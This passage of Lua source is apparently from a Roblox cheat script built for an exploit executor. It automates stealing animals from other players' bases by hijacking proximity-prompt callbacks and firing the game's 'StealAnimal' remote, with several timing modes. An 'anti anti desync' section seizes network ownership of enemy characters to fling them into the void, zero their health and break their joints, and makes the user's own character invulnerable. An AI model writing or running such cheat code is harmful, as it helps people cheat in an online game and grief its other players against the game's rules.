                    if input.UserInputState == Enum.UserInputState.End then
                        if dragging then
                            dragging = false
                            saveStealBarPos()
                        end
                    end
                end)
            end
        end)
        UIS.InputChanged:Connect(function(input)
            if not dragging then return end
            if M.mobileButtonsLocked or M.uiLocked then
                dragging = false
                return
            end
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                local delta = input.Position - dragStart
                holder.Position = UDim2.new(
                    startPos.X.Scale, startPos.X.Offset + delta.X,
                    startPos.Y.Scale, startPos.Y.Offset + delta.Y
                )
            end
        end)
        UIS.InputEnded:Connect(function(input)
            if dragging and (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
                dragging = false
                saveStealBarPos()
            end
        end)
    end

    -- FPS / Ping + white pulse while stealing
    do
        local last = tick()
        local frames = 0
        local fps = 60
        local pulseT = 0
        M._stealBarStatsConn = RunService.RenderStepped:Connect(function(dt)
            frames = frames + 1
            local now = tick()
            if now - last >= 0.4 then
                fps = math.floor(frames / (now - last) + 0.5)
                frames = 0
                last = now
                local pingMs = 0
                pcall(function()
                    pingMs = math.floor(player:GetNetworkPing() * 1000 + 0.5)
                end)
                if M.statusPingLbl then
                    M.statusPingLbl.Text = tostring(pingMs) .. "ms"
                end
            end
            -- pulse white dot while stealing
            if M.statusDot then
                if M._statusDotPulsing then
                    pulseT = pulseT + (dt or 0.016) * 6
                    local a = 0.15 + 0.45 * (0.5 + 0.5 * math.sin(pulseT))
                    M.statusDot.BackgroundTransparency = a
                    M.statusDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                else
                    M.statusDot.BackgroundTransparency = 0.25
                    M.statusDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                end
            end
        end)
    end
end

function M.updateStealProgress(progress, label)
    progress = math.clamp(progress or 0, 0, 1)
    local pct = math.floor(progress * 100 + 0.5)
    if M.statusFill then
        M.statusFill.Size = UDim2.new(progress, 0, 1, 0)
        M.statusFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        local grad = M.statusFill:FindFirstChildOfClass("UIGradient")
        if grad then
            grad.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255))
        end
    end
    local text = tostring(pct) .. "%"
    if M.statusBarPctLbl then M.statusBarPctLbl.Text = text end
    if M.statusPctLbl and M.statusPctLbl ~= M.statusBarPctLbl then
        M.statusPctLbl.Text = text
    end
    if M.statusStealLbl then
        if progress <= 0.001 then
            M.statusStealLbl.Text = "READY"
        else
            M.statusStealLbl.Text = (type(label) == "string" and label ~= "" and label) or "STEAL"
        end
    end
    -- white only; pulse while active steal
    M._statusDotPulsing = progress > 0.001
    if M.statusDot then
        M.statusDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    end
    M._stealShineActive = false
    if M._stealShineTween then pcall(function() M._stealShineTween:Cancel() end) end
end

function M.updateStatusRadius()
    if M.statusRadiusLbl then
        M.statusRadiusLbl.Text = "Radius: " .. tostring(M.getActiveStealRadius())
    end
    if M.headerRadiusLbl then
        M.headerRadiusLbl.Text = tostring(M.getActiveStealRadius())
    end
    if M.updateRadiusMarker then
        M.updateRadiusMarker()
    end
end

-- ============================================================
-- AUTO STEAL (unchanged)
-- ============================================================
if not fireproximityprompt then
    fireproximityprompt = (getgenv and getgenv().fireproximityprompt)
        or (genv and genv().fireproximityprompt)
        or function(prompt)
            pcall(function()
                prompt:InputHoldBegin()
                task.wait(0.05)
                prompt:InputHoldEnd()
            end)
        end
end

local function isMyPlot(plotName)
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return false end
    local plot = plots:FindFirstChild(plotName)
    if not plot then return false end
    local sign = plot:FindFirstChild("PlotSign")
    if sign then
        local yb = sign:FindFirstChild("YourBase")
        if yb and yb:IsA("BillboardGui") then return yb.Enabled == true end
    end
    return false
end

local function scanPlotNormal(plot)
    if not plot or not plot:IsA("Model") then return end
    if isMyPlot(plot.Name) then return end
    local podiums = plot:FindFirstChild("AnimalPodiums")
    if not podiums then return end
    for _, pod in ipairs(podiums:GetChildren()) do
        if pod:IsA("Model") and pod:FindFirstChild("Base") then
            local uid = plot.Name .. "_" .. pod.Name
            for _, ex in ipairs(M.animalCache) do if ex.uid == uid then return end end
            table.insert(M.animalCache, {
                name = pod.Name,
                plot = plot.Name,
                slot = pod.Name,
                worldPosition = pod:GetPivot().Position,
                uid = uid,
            })
        end
    end
end

local function findPromptNormal(ad)
    if not ad then return nil end
    local cp = M.promptCache[ad.uid]
    if cp and cp.Parent then return cp end
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return nil end
    local plot = plots:FindFirstChild(ad.plot)
    if not plot then return nil end
    local pods = plot:FindFirstChild("AnimalPodiums")
    if not pods then return nil end
    local pod = pods:FindFirstChild(ad.slot)
    if not pod then return nil end
    local base = pod:FindFirstChild("Base")
    if not base then return nil end
    local spawn = base:FindFirstChild("Spawn")
    if not spawn then return nil end
    local att = spawn:FindFirstChild("PromptAttachment")
    local prompt = nil
    if att then
        for _, p in ipairs(att:GetChildren()) do
            if p:IsA("ProximityPrompt") then prompt = p; break end
        end
    end
    if not prompt then
        for _, obj in ipairs(spawn:GetDescendants()) do
            if obj:IsA("ProximityPrompt") then prompt = obj; break end
        end
    end
    if prompt then M.promptCache[ad.uid] = prompt end
    return prompt
end

local function nearestAnimalNormal()
    local char = player.Character
    if not char then return nil end
    local hrp = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso")
    if not hrp then return nil end
    local best, bestD = nil, math.huge
    for _, ad in ipairs(M.animalCache) do
        if not isMyPlot(ad.plot) and ad.worldPosition then
            local d = (hrp.Position - ad.worldPosition).Magnitude
            if d < bestD then bestD = d; best = ad end
        end
    end
    return best, bestD
end

local function buildCallbacks(prompt)
    if M.stealCache[prompt] then return end
    local data = { holdCallbacks = {}, triggerCallbacks = {}, ready = true }
    local ok1, c1 = pcall(getconnections, prompt.PromptButtonHoldBegan)
    if ok1 and type(c1) == "table" then
        for _, conn in ipairs(c1) do
            if type(conn.Function) == "function" then
                table.insert(data.holdCallbacks, conn.Function)
            end
        end
    end
    local ok2, c2 = pcall(getconnections, prompt.Triggered)
    if ok2 and type(c2) == "table" then
        for _, conn in ipairs(c2) do
            if type(conn.Function) == "function" then
                table.insert(data.triggerCallbacks, conn.Function)
            end
        end
    end
    if #data.holdCallbacks > 0 or #data.triggerCallbacks > 0 then
        M.stealCache[prompt] = data
    end
end

local function execStealNormal(prompt, animalName)
    local data = M.stealCache[prompt]
    if not data or not data.ready then return false end
    data.ready = false
    M.isStealing = true
    M.stealStartTime = tick()
    M.updateStealProgress(0.1)

    if M.progressConn then M.progressConn:Disconnect() end
    M.progressConn = RunService.Heartbeat:Connect(function()
        if not M.isStealing then
            M.progressConn:Disconnect()
            M.progressConn = nil
            return
        end
        local prog = math.clamp((tick() - M.stealStartTime) / M.Steal.StealDuration, 0, 1)
        M.updateStealProgress(prog)
    end)

    task.spawn(function()
        for _, fn in ipairs(data.holdCallbacks) do task.spawn(fn) end
        local elapsed = 0
        while elapsed < M.Steal.StealDuration do elapsed = elapsed + task.wait() end
        for _, fn in ipairs(data.triggerCallbacks) do task.spawn(fn) end
        task.wait(0.01)
        if M.progressConn then M.progressConn:Disconnect(); M.progressConn = nil end
        M.isStealing = false
        M.updateStealProgress(0)
        data.ready = true
    end)
    return true
end

function M.startNormalSteal()
    if M.stealConn then return end
    M.stealConn = RunService.Heartbeat:Connect(function()
        if not M.Steal.AutoStealEnabled or (M.stealMode ~= "Normal" and M.stealMode ~= "V1") or M.isStealing then return end
        local target, dist = nearestAnimalNormal()
        if not target then return end
        if dist > M.getActiveStealRadius() then return end
        local prompt = M.promptCache[target.uid]
        if not prompt or not prompt.Parent then
            prompt = findPromptNormal(target)
        end
        if prompt then
            buildCallbacks(prompt)
            execStealNormal(prompt, target.name)
        end
    end)
end

function M.stopNormalSteal()
    if M.stealConn then
        M.stealConn:Disconnect()
        M.stealConn = nil
    end
    M.isStealing = false
    if M.progressConn then M.progressConn:Disconnect(); M.progressConn = nil end
    M.updateStealProgress(0)
end

-- ============================================================
-- V2 + SEMI AUTO-STEAL (Balenci / Y-out: FREEZE BAR AT 73%, finish when close)
-- ============================================================
do
    local V2 = M.V2 or {}
    M.V2 = V2
    V2.enabled = false
    V2.isStealing = false
    V2.conn = nil
    V2.progressConn = nil

    -- Hard defaults matching the script you sent
    M.Steal.StealDuration = tonumber(M.Steal.StealDuration) or 1.3
    M.Steal.StopTime = 0.96 -- pause ~75% like TS V2
    M.autoGrabSetDelayRadius = tonumber(M.autoGrabSetDelayRadius) or 9
    M.autoGrabStopEnabled = true
    M.autoGrabPausePct = 0.73 -- ALWAYS stop visual/logic at 73%

    local function barSet(p, label)
        local progress = math.clamp(tonumber(p) or 0, 0, 1)
        local pct = math.floor(progress * 100 + 0.5)
        local text = tostring(pct) .. "%"
        if type(label) == "string" and label ~= "" then
            text = string.upper(label) .. "  " .. text
        end
        M.updateStealProgress(progress, text)
        if M.statusFill then
            M.statusFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        end
    end
    local function barReset()
        M.updateStealProgress(0)
        if M.statusFill then
            M.statusFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        end
    end

    local function distToPrompt(prompt)
        local char = player.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp or not prompt then return math.huge end
        local part = prompt:FindFirstAncestorWhichIsA("BasePart")
            or (prompt.Parent and prompt.Parent:IsA("BasePart") and prompt.Parent)
            or (prompt.Parent and prompt.Parent.Parent and prompt.Parent.Parent:IsA("BasePart") and prompt.Parent.Parent)
        if not part then return math.huge end
        return (hrp.Position - part.Position).Magnitude
    end

    -- Shared Balenci grab: pause at 73%, wait until delay radius, then finish + fire
    local function execBalenciSteal(prompt, animalName, modeName)
        if V2.isStealing then return end
        if not prompt then return end
        buildCallbacks(prompt)
        local data = M.stealCache[prompt]
        if not data or not data.ready then return end
        data.ready = false
        V2.isStealing = true
        M.isStealing = true

        local duration = math.max(tonumber(M.Steal.StealDuration) or 1.3, 0.5)
        local pausePct = 0.75 -- FIXED 73% like your script
        local stopTime = duration * pausePct -- time to reach 73%
        local delayRadius = math.max(tonumber(M.autoGrabSetDelayRadius) or 9, 1)
        local stealRadius = (modeName == "Semi") and math.min(tonumber(M.Semi.radius) or 10, 10) or M.getActiveStealRadius()

        barSet(0, "STEAL")

        task.spawn(function()
            for _, fn in ipairs(data.holdCallbacks or {}) do task.spawn(fn) end
            local startTime = tick()
            local promptFired = false

            local function stillOn()
                if not V2.isStealing then return false end
                if not M.Steal.AutoStealEnabled then return false end
                if M.stealMode ~= modeName then return false end
                if not prompt or not prompt.Parent then return false end
                return true
            end

            -- PHASE 1: fill from 0% → 73% then FREEZE
            while stillOn() do
                local elapsed = tick() - startTime
                local prog = math.clamp(elapsed / duration, 0, 1)
                if prog >= pausePct then
                    barSet(pausePct, "HOLD") -- lock at 73%
                    break
                end
                barSet(prog, "STEAL")
                if distToPrompt(prompt) > stealRadius then break end
                task.wait()
            end

            if not stillOn() then
                barReset()
                data.ready = true
                V2.isStealing = false
                M.isStealing = false
                return
            end

            -- hold bar visually at 73%
            barSet(pausePct, "HOLD")

            -- PHASE 2: wait until within delay radius (9) or timeout → restart
            local phase2Timeout = math.max(2.99 - stopTime - math.max(duration - stopTime, 0), 0.15)
            local phase2Start = tick()
            while stillOn() do
                if tick() - phase2Start >= phase2Timeout then
                    barReset()
                    data.ready = true
                    V2.isStealing = false
                    M.isStealing = false
                    task.wait()
                    local target, dist = nearestAnimalNormal()
                    local rad = (modeName == "Semi") and math.min(tonumber(M.Semi.radius) or 10, 10) or M.getActiveStealRadius()
                    if target and dist <= rad then
                        local p2 = M.promptCache[target.uid]
                        if not p2 or not p2.Parent then p2 = findPromptNormal(target) end
                        if p2 then execBalenciSteal(p2, target.name, modeName) end
                    end
                    return
                end
                local dist = distToPrompt(prompt)
                if dist <= delayRadius then
                    break
                elseif dist > stealRadius then
                    barReset()
                    data.ready = true
                    V2.isStealing = false
                    M.isStealing = false
                    return
                end
                -- keep bar frozen at 73%
                barSet(pausePct, "HOLD")
                task.wait()
            end

            -- PHASE 3: finish 73% → 100% then fire
            if stillOn() then
                local fillStart = tick()
                local fillDuration = math.max(duration * (1 - pausePct), 0.05)
                while stillOn() do
                    local fp = math.clamp((tick() - fillStart) / fillDuration, 0, 1)
                    local prog = pausePct + fp * (1 - pausePct)
                    barSet(prog, "STEAL")
                    if fp >= 1 and not promptFired then
                        promptFired = true
                        for _, fn in ipairs(data.triggerCallbacks or {}) do task.spawn(fn) end
                        pcall(function()
                            local RS = game:GetService("ReplicatedStorage")
                            local remote = RS:FindFirstChild("StealAnimal")
                            if remote and animalName then remote:FireServer(animalName) end
                        end)
                        pcall(function()
                            if fireproximityprompt then fireproximityprompt(prompt) end
                        end)
                        pcall(function()
                            if _G.AutoCarrySpeed and _G.AutoCarrySpeed.WatchPickup then
                                _G.AutoCarrySpeed.WatchPickup(1.25)
                            end
                        end)
                        break
                    end
                    task.wait()
                end
            end

            barReset()
            data.ready = true
            V2.isStealing = false
            M.isStealing = false
        end)
    end

    function M.startV2Steal()
        V2.enabled = true
        V2.isStealing = false
        if V2.conn then V2.conn:Disconnect(); V2.conn = nil end
        V2.conn = RunService.Heartbeat:Connect(function()
            if not V2.enabled then return end
            if not M.Steal.AutoStealEnabled then return end
            if M.stealMode ~= "V2" then M.stopV2Steal(); return end
            if V2.isStealing then return end
            local target, dist = nearestAnimalNormal()
            if not target then return end
            if dist > M.getActiveStealRadius() then return end
            local prompt = M.promptCache[target.uid]
            if not prompt or not prompt.Parent then prompt = findPromptNormal(target) end
            if prompt then execBalenciSteal(prompt, target.name, "V2") end
        end)
    end

    function M.stopV2Steal()
        V2.enabled = false
        V2.isStealing = false
        if V2.conn then V2.conn:Disconnect(); V2.conn = nil end
        M.isStealing = false
        barReset()
    end

    -- SEMI = same Balenci 73% logic, tighter radius
    function M.startSemiSteal()
        M.Semi.enabled = true
        V2.isStealing = false
        if M.Semi.conn then M.Semi.conn:Disconnect(); M.Semi.conn = nil end
        M.Semi.conn = RunService.Heartbeat:Connect(function()
            if not M.Semi.enabled then return end
            if not M.Steal.AutoStealEnabled then return end
            if M.stealMode ~= "Semi" then M.stopSemiSteal(); return end
            if V2.isStealing then return end
            local target, dist = nearestAnimalNormal()
            if not target then return end
            local rad = math.min(tonumber(M.Semi.radius) or 10, 10)
            if dist > rad then return end
            local prompt = M.promptCache[target.uid]
            if not prompt or not prompt.Parent then prompt = findPromptNormal(target) end
            if prompt then execBalenciSteal(prompt, target.name, "Semi") end
        end)
    end

    function M.stopSemiSteal()
        M.Semi.enabled = false
        if M.Semi.conn then M.Semi.conn:Disconnect(); M.Semi.conn = nil end
        if M.stealMode == "Semi" then
            V2.isStealing = false
            M.isStealing = false
            barReset()
        end
    end
end

function M.startV3Steal()
    -- Original V3: continuous hold fill → trigger at 100% (no pause phases)
    if M.V3.conn then return end
    M.V3.enabled = true
    M.V3.progress = 0
    M.V3.currentUid = nil
    M.V3.lastInRange = 0
    M.V3.holding = false
    M.V3.holdPrompt = nil
    M.V3.cooldownUntil = 0
    M.V3.lastHoldPulse = 0

    M.V3.conn = RunService.Heartbeat:Connect(function(dt)
        if not M.Steal.AutoStealEnabled or M.stealMode ~= "V3" or not M.V3.enabled then
            if M.V3.holdPrompt then v3ReleasePrompt(M.V3.holdPrompt) end
            if M.V3.progress > 0 or M.V3.holding or M.isStealing then
                M.V3.progress = 0
                M.V3.currentUid = nil
                M.V3.holding = false
                M.V3.holdPrompt = nil
                M.isStealing = false
                M.updateStealProgress(0)
            end
            return
        end

        local stopT = math.max(tonumber(M.Steal.StopTime) or 0.35, 0.05)
        local holdT = math.max(tonumber(M.Steal.StealDuration) or 1.4, 0.05)

        if tick() < (M.V3.cooldownUntil or 0) then
            M.updateStealProgress(0)
            return
        end

        local char = player.Character
        local hrp = char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso"))
        if not hrp then return end

        local target = nearestAnimalNormal()
        local dist = target and v3LiveDist(target, hrp) or math.huge
        local radius = M.getActiveStealRadius()
        local inRange = target ~= nil and dist <= radius

        if inRange then
            M.V3.lastInRange = tick()

            if M.V3.currentUid ~= target.uid then
                if M.V3.holdPrompt then v3ReleasePrompt(M.V3.holdPrompt) end
                M.V3.currentUid = target.uid
                M.V3.progress = 0
                M.V3.holding = false
                M.V3.holdPrompt = nil
            end

            local prompt = M.promptCache[target.uid]
            if not prompt or not prompt.Parent then
                prompt = findPromptNormal(target)
            end
            if not prompt then
                M.V3.progress = math.clamp(M.V3.progress + (dt / holdT), 0, 1)
                M.updateStealProgress(M.V3.progress)
                M.isStealing = M.V3.progress > 0
                return
            end

            M.V3.holdPrompt = prompt
            M.isStealing = true
            local now = tick()
            if (not M.V3.holding) or (now - (M.V3.lastHoldPulse or 0) > 0.1) then
                M.V3.holding = true
                M.V3.lastHoldPulse = now
                v3HoldPrompt(prompt)
            end

            M.V3.progress = math.clamp(M.V3.progress + (dt / holdT), 0, 1)
            M.updateStealProgress(M.V3.progress)

            if M.V3.progress >= 1 then
                v3TriggerPrompt(prompt)
                M.V3.progress = 0
                M.V3.currentUid = nil
                M.V3.holding = false
                M.V3.holdPrompt = nil
                M.isStealing = false
                M.updateStealProgress(0)
                M.V3.cooldownUntil = tick() + math.max(stopT, 0.25)
            end
        else
            if M.V3.holding or M.V3.holdPrompt then
                v3ReleasePrompt(M.V3.holdPrompt)
                M.V3.holding = false
                M.V3.holdPrompt = nil
            end

            if M.V3.progress > 0 then
                local decay = dt / stopT
                M.V3.progress = math.max(0, M.V3.progress - decay)
                M.updateStealProgress(M.V3.progress)
                if M.V3.progress <= 0 then
                    M.V3.currentUid = nil
                    M.isStealing = false
                    M.updateStealProgress(0)
                else
                    M.isStealing = true
                end
            else
                M.isStealing = false
            end
        end
    end)
end

function M.stopV3Steal()
    M.V3.enabled = false
    if M.V3.holdPrompt then
        v3ReleasePrompt(M.V3.holdPrompt)
    end
    if M.V3.conn then
        pcall(function() M.V3.conn:Disconnect() end)
        M.V3.conn = nil
    end
    M.V3.progress = 0
    M.V3.currentUid = nil
    M.V3.holding = false
    M.V3.holdPrompt = nil
    M.V3.cooldownUntil = 0
    M.V3.lastInRange = 0
    M.V3.lastHoldPulse = 0
    M.isStealing = false
    M.updateStealProgress(0)
end

function M.startAutoSteal()
    if M.statusGui then M.statusGui.Enabled = true end
    local mode = M.stealMode
    if mode == "Semi" then
        M.startSemiSteal()
    elseif mode == "V3" then
        M.startV3Steal()
    elseif mode == "V1" or mode == "Normal" then
        M.startNormalSteal()
    else
        -- V2 (default)
        M.stealMode = "V2"
        M.startV2Steal()
    end
end

function M.stopAutoSteal()
    if M.statusGui then M.statusGui.Enabled = true end
    M.stopNormalSteal()
    M.stopSemiSteal()
    if M.stopV2Steal then M.stopV2Steal() end
    if M.stopV3Steal then M.stopV3Steal() end
    M.isStealing = false
    M.updateStealProgress(0)
end

function M.setStealRadius(radius)
    M.Steal.StealRadius = radius
    M.updateStatusRadius()
end

-- ============================================================
-- OTHER CORE FUNCTIONS (unchanged - abbreviate per spazio)
-- ============================================================
function M.findBat()
    local char=player.Character;if not char then return nil end
    for _,tool in ipairs(char:GetChildren()) do if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end end
    local bp=player:FindFirstChild("Backpack");if bp then for _,tool in ipairs(bp:GetChildren()) do if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end end end
    return nil
end

function M.findMedusa()
    local c=player.Character;if not c then return nil end
    for _,t in ipairs(c:GetChildren()) do if t:IsA("Tool") then local n=t.Name:lower();if n:find("medusa") or n:find("head") or n:find("stone") then return t end end end
    local bp=player:FindFirstChild("Backpack");if bp then for _,t in ipairs(bp:GetChildren()) do if t:IsA("Tool") then local n=t.Name:lower();if n:find("medusa") or n:find("head") or n:find("stone") then return t end end end end
    return nil
end

function M.useMedusaCounter()
    if M.medusaDebounce then return end;if M.MEDUSA_COOLDOWN>(tick()-M.medusaLastUsed) then return end
    local c=player.Character;if not c then return end;M.medusaDebounce=true
    local med=M.findMedusa();if not med then M.medusaDebounce=false;return end
    if med.Parent~=c then local hum2=c:FindFirstChildOfClass("Humanoid");if hum2 then hum2:EquipTool(med) end end
    pcall(function() med:Activate() end);M.medusaLastUsed=tick();M.medusaDebounce=false
end

function M.onAnchorChanged(part)
    return part:GetPropertyChangedSignal("Anchored"):Connect(function()
        if not part.Anchored then return end
        if M._isInstaResetting then return end
        -- Medusa Reset / insta-reset removed — only counter remains
        if M.medusaCounterEnabled and part.Transparency == 1 then
            pcall(function() M.useMedusaCounter() end)
        end
    end)
end

function M.setupMedusa(char)
    for _,c in pairs(M.Conns.anchor) do pcall(function() c:Disconnect() end) end;M.Conns.anchor={}
    if not char then return end
    for _,part in ipairs(char:GetDescendants()) do if part:IsA("BasePart") then table.insert(M.Conns.anchor,M.onAnchorChanged(part)) end end
    table.insert(M.Conns.anchor,char.DescendantAdded:Connect(function(part) if part:IsA("BasePart") then table.insert(M.Conns.anchor,M.onAnchorChanged(part)) end end))
end

function M.stopMedusaCounter() for _,c in pairs(M.Conns.anchor) do pcall(function() c:Disconnect() end) end;M.Conns.anchor={} end

function M.findBatForCounter()
    local c=player.Character;if not c then return nil end;local bp=player:FindFirstChildOfClass("Backpack")
    for _,name in ipairs(M.BAT_COUNTER_SLAP_LIST) do local t=c:FindFirstChild(name) or (bp and bp:FindFirstChild(name));if t then return t end end
    for _,ch in ipairs(c:GetChildren()) do if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end end
    if bp then for _,ch in ipairs(bp:GetChildren()) do if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end end end
    return nil
end

function M.swingBatForCounter(bat,char)
    local hum2=char:FindFirstChildOfClass("Humanoid")
    if bat.Parent~=char then if hum2 then pcall(function() hum2:EquipTool(bat) end) end;task.wait(0.05) end
    local remote=bat:FindFirstChildOfClass("RemoteEvent") or bat:FindFirstChildOfClass("RemoteFunction")
    if remote and remote:IsA("RemoteEvent") then pcall(function() remote:FireServer() end);task.wait(0.15);pcall(function() remote:FireServer() end)
    else pcall(function() bat:Activate() end);task.wait(0.15);pcall(function() bat:Activate() end) end
end

-- Bat Counter: on ragdoll → counter swing
function M.startBatCounter()
    if M.Conns.batCounter then return end
    M.Conns.batCounter = RunService.Heartbeat:Connect(function()
        if not M.batCounterEnabled or M.batCounterDebounce then return end
        local char = player.Character
        if not char then return end
        local hum2 = char:FindFirstChildOfClass("Humanoid")
        if not hum2 then return end
        local st = hum2:GetState()
        if st == Enum.HumanoidStateType.Physics
            or st == Enum.HumanoidStateType.Ragdoll
            or st == Enum.HumanoidStateType.FallingDown then
            M.batCounterDebounce = true
            task.spawn(function()
                task.wait(0.15)
                local bat = M.findBatForCounter()
                if bat then
                    M.swingBatForCounter(bat, char)
                end
                task.wait(0.35)
                M.batCounterDebounce = false
            end)
        end
    end)
end

function M.stopBatCounter()
    if M.Conns.batCounter then
        M.Conns.batCounter:Disconnect()
        M.Conns.batCounter = nil
    end
    M.batCounterDebounce = false
end

-- ============================================================
-- VYNX ANTI ANTI DESYNC (protect self from enemy TP Bat)
-- Detects enemy TP Bat onto you → hard protect self + force-kill / void them
-- ============================================================
function M._aadApplyBodyKill(eRoot, myRoot)
    if not eRoot then return end
    pcall(function()
        -- remove old movers
        for _, n in ipairs({"VynxAadBV", "VynxAadAV", "VynxAadBP"}) do
            local o = eRoot:FindFirstChild(n)
            if o then o:Destroy() end
        end
        local bv = Instance.new("BodyVelocity")
        bv.Name = "VynxAadBV"
        bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)
        bv.P = 1e5
        local away = (eRoot.Position - myRoot.Position)
        if away.Magnitude < 0.1 then away = Vector3.new(0, 1, 0) end
        away = away.Unit
        if M.aadVersion == "V2" then
            bv.Velocity = Vector3.new(0, -400, 0) + away * 60
        else
            bv.Velocity = away * 140 + Vector3.new(0, 80, 0)
        end
        bv.Parent = eRoot
        local av = Instance.new("BodyAngularVelocity")
        av.Name = "VynxAadAV"
        av.MaxTorque = Vector3.new(1e9, 1e9, 1e9)
        av.AngularVelocity = Vector3.new(40, 40, 40)
        av.Parent = eRoot
        task.delay(1.2, function()
            pcall(function() if bv and bv.Parent then bv:Destroy() end end)
            pcall(function() if av and av.Parent then av:Destroy() end end)
        end)
    end)
end

function M._aadKillOrVoidEnemy(enemyChar, myRoot)
    if not enemyChar or not myRoot then return end
    local eRoot = enemyChar:FindFirstChild("HumanoidRootPart")
    local eHum = enemyChar:FindFirstChildOfClass("Humanoid")
    if not eRoot then return end
    pcall(function()
        pcall(function()
            if eRoot:CanSetNetworkOwnership() then
                eRoot:SetNetworkOwner(player)
            end
        end)
        eRoot.AssemblyLinearVelocity = Vector3.zero
        eRoot.AssemblyAngularVelocity = Vector3.zero

        if M.aadVersion == "V2" then
            -- hard void + death spam
            local voidCF = CFrame.new(eRoot.Position.X, -800, eRoot.Position.Z)
            for _ = 1, 6 do
                eRoot.CFrame = voidCF
                eRoot.AssemblyLinearVelocity = Vector3.new(0, -500, 0)
                if eHum then
                    pcall(function()
                        eHum.PlatformStand = true
                        eHum.Sit = true
                        eHum.Health = 0
                        eHum:ChangeState(Enum.HumanoidStateType.Dead)
                        eHum:ChangeState(Enum.HumanoidStateType.Physics)
                    end)
                end
            end
            -- break joints if possible
            pcall(function()
                if eHum then eHum.BreakJointsOnDeath = true end
                enemyChar:BreakJoints()
            end)
            M._aadApplyBodyKill(eRoot, myRoot)
        else
            -- V1: push away + knock + body kill
            local away = (eRoot.Position - myRoot.Position)
            if away.Magnitude < 0.1 then away = Vector3.new(1, 0, 0) end
            away = away.Unit
            eRoot.CFrame = CFrame.new(myRoot.Position + away * 22 + Vector3.new(0, 6, 0))
            eRoot.AssemblyLinearVelocity = away * 160 + Vector3.new(0, 90, 0)
            if eHum then
                pcall(function()
                    eHum.PlatformStand = true
                    eHum:ChangeState(Enum.HumanoidStateType.FallingDown)
                    eHum:ChangeState(Enum.HumanoidStateType.Physics)
                end)
            end
            M._aadApplyBodyKill(eRoot, myRoot)
        end
    end)
end

function M._aadProtectSelf(char, hardLock)
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")
    if not hum or not root then return end
    pcall(function()
        -- same anti-die harden used by TP Bat
        if _adHarden then _adHarden(hum) end
        hum.BreakJointsOnDeath = false
        hum.RequiresNeck = false
        hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
        hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
        hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
        hum:SetStateEnabled(Enum.HumanoidStateType.Physics, false)
        hum.PlatformStand = false
        hum.Sit = false
        hum.MaxHealth = math.huge
        if hum.Health < hum.MaxHealth or hum.Health <= 0 then
            hum.Health = math.huge
        end
        local st = hum:GetState()
        if st == Enum.HumanoidStateType.Dead
            or st == Enum.HumanoidStateType.Ragdoll
            or st == Enum.HumanoidStateType.FallingDown
            or st == Enum.HumanoidStateType.Physics then
            hum:ChangeState(Enum.HumanoidStateType.Running)
        end
        pcall(function()
            if root:CanSetNetworkOwnership() then
                root:SetNetworkOwner(player)
            end
        end)
        -- strip fling / void pull
        local v = root.AssemblyLinearVelocity
        local av = root.AssemblyAngularVelocity
        if v ~= v or av ~= av or v.Magnitude > 60 or math.abs(v.Y) > 50 then
            root.AssemblyLinearVelocity = Vector3.zero
            root.AssemblyAngularVelocity = Vector3.zero
        end
        local p = root.Position
        if p.Y < -5 or p ~= p or math.abs(p.X) > 5e4 or math.abs(p.Z) > 5e4 then
            if M._aadLastGoodCF then
                root.CFrame = M._aadLastGoodCF
            else
                root.CFrame = CFrame.new(p.X, 25, p.Z)
            end
            root.AssemblyLinearVelocity = Vector3.zero
            root.AssemblyAngularVelocity = Vector3.zero
        end
        if hardLock then
            local lockCF = M._aadLastGoodCF
            if lockCF then
                root.CFrame = lockCF
            end
            root.AssemblyLinearVelocity = Vector3.zero
            root.AssemblyAngularVelocity = Vector3.zero
            -- BodyPosition hold so server desync can't drag you
            local bp = root:FindFirstChild("VynxAadHold")
            if not bp then
                bp = Instance.new("BodyPosition")
                bp.Name = "VynxAadHold"
                bp.MaxForce = Vector3.new(1e9, 1e9, 1e9)
                bp.P = 2e5
                bp.D = 5e3
                bp.Parent = root
            end
            bp.Position = (lockCF and lockCF.Position) or root.Position
        else
            local bp = root:FindFirstChild("VynxAadHold")
            if bp then pcall(function() bp:Destroy() end) end
        end
        -- no collide with other players (TP bat collision abuse)
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = (part.Name == "HumanoidRootPart") and false or part.CanCollide
            end
        end
        for _, pl in ipairs(Players:GetPlayers()) do
            if pl ~= player and pl.Character then
                for _, part in ipairs(pl.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        pcall(function() part.CanCollide = false end)
                    end
                end
            end
        end
    end)
end

function M._aadCounterSwing(targetRoot)
    local char = player.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local myRoot = char:FindFirstChild("HumanoidRootPart")
    if not hum or not myRoot then return end
    pcall(function()
        local bat = nil
        if M.findBatForCounter then bat = M.findBatForCounter() end
        if not bat then
            for _, t in ipairs(char:GetChildren()) do
                if t:IsA("Tool") and string.find(string.lower(t.Name), "bat", 1, true) then
                    bat = t; break
                end
            end
        end
        if not bat then
            local bp = player:FindFirstChild("Backpack")
            if bp then
